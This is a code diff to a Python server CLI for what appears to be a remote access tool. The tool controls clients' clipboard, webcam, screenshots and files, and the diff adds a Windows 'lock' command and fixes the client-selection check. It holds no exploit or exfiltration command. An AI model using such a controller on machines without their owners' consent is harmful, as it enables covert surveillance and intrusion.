@@ -6,7 +6,7 @@ from contextlib import suppress
 from cryptography import x509
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import ec
-from modules import clipboard, download, filetransfer, screenshot, webcam
+from modules import clipboard, download, filetransfer, screenshot, webcam, windows
 from modules.baseserver import BaseServer
 from utils import terminal
 from utils.prompts import increase_timeout_prompt
@@ -39,6 +39,7 @@ paste
 receive
 send
 download
+lock (windows only)
 exit
 """
 
@@ -71,13 +72,15 @@ class ServerCLI(BaseServer, cmd.Cmd):
 
     def __check_select(self) -> bool | None:
         """ Check if a client is selected """
-        if self.client is not None:
-            print("Client has already been selected.")
+        if self.client is None:
+            print("Select a client first.")
             return True
 
     def do_open(self, id) -> None:
         """ Interact with a client """
-        if self.__check_select(): return
+        if self.client is not None:
+            print('A client has already been selected.')
+            return
 
         # Create a copy of the clients list
         # This ensures the list is looped through entirely
@@ -257,6 +260,17 @@ class ServerCLI(BaseServer, cmd.Cmd):
             print(str(error))
         else:
             print("Successfully downloaded file.")
+
+    def do_lock(self, _) -> None:
+        """ Lock client machine """
+        if self.__check_select(): return
+
+        try:
+            windows.lock_machine(self.client)
+        except RuntimeError as error:
+            print(str(error))
+        else:
+            print('Successfully locked client machine.')
 
 
 if __name__ == '__main__':
